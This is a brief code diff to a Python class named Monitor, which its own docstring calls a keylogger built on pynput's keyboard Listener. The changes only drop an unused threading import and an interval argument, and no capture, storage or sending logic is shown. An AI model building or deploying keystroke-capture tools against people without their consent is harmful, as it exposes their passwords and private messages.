@@ -1,5 +1,4 @@
 from pynput.keyboard import Key, Listener
-from threading import Timer, Thread
 import time
 import os
 
@@ -21,7 +20,7 @@ class Monitor:
 		with Listener(on_press = self._on_press, on_release = self._on_release) as listener:
 			listener.join()
 	
-	def run(self, interval = 1):
+	def run(self):
 		"""
 		Launch the keylogger with a threads.
 		"""
